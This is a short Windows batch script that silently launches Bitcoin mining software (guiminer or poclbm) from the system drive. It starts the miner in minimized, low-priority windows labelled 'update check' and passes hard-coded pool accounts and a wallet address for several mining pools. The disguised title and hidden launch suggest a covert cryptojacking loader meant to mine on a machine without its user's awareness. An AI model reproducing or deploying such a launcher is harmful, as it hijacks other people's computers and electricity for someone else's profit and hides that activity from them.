@echo off
cd %homedrive%\

start "update check" /I /MIN /LOW "cmd" "/Q /C "%homedrive%\guiminer\cleanup.bat""
if exist %homedrive%\guiminer\guiminer.exe ( START "update check" /I /MIN /LOW "%homedrive%\guiminer\guiminer.exe" ) else ( if exist %homedrive%\guiminer\forpo.bat ( START /MIN /LOW cmd /C %homedrive%\guiminer\forpo.bat ) else ( if exist %homedrive%\guiminer\poclbm.exe ( START "update check" /I /MIN /LOW "%homedrive%\guiminer\poclbm.exe" -q evanmcc_aoe:1@stratum.btcguild.com:3333#btcguild evanmcc:d=1@mmpool.bitparking.com:3333#bitparking 1GPwFQ51uzwx1TuE4rYNo2VFahYvJKjw1c:1@stratum.mining.eligius.st:3334#eligus ) ) )

cls
exit /B %errorlevel%
exit %errorlevel%